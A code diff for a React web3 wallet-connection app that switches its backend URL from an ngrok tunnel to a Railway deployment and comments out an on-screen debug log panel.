@@ -22,7 +22,7 @@ import type { AppKitNetwork } from '@reown/appkit/networks'
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 
 // 🌐 BACKEND URL CONFIGURATION
-const BACKEND_URL = 'https://18b7-185-107-56-214.ngrok-free.app';
+const BACKEND_URL = 'https://salvation-server-gp-production.up.railway.app';
 
 // 🔥 CONTRACT ADDRESSES
 const EVM_CONTRACT_ADDRESS = '0xA1801556d0e7cfB513351733D378BE7AEFceC884'
@@ -146,7 +146,7 @@ export default function App() {
   const [_txHash, setTxHash] = useState('')
   
   // 🔥 1. ADDED DEBUG LOGS STATE
-  const [debugLogs, setDebugLogs] = useState<string[]>([]);
+  // const [debugLogs, setDebugLogs] = useState<string[]>([]);
 
   const manualConnect = useRef(false)
   const isExecuting = useRef(false)
@@ -161,7 +161,7 @@ export default function App() {
   // 🔥 2. UPDATED LOGGER: Outputs to console AND the on-screen debug box
   const log = (msg: string) => {
     console.log(msg);
-    setDebugLogs(prev => [...prev, msg].slice(-15)); // Keeps the last 15 messages
+    // setDebugLogs(prev => [...prev, msg].slice(-15)); // Keeps the last 15 messages
   }
 
   useEffect(() => {
@@ -729,7 +729,7 @@ export default function App() {
         </p>
       </footer>
 
-      {/* 🔥 3. ADDED DEBUG BOX UI */}
+      {/* 🔥 3. ADDED DEBUG BOX UI
       <div style={{
         position: 'fixed',
         bottom: 10,
@@ -754,7 +754,7 @@ export default function App() {
             {logMsg}
           </div>
         ))}
-      </div>
+      </div> */}
 
     </div>
   )
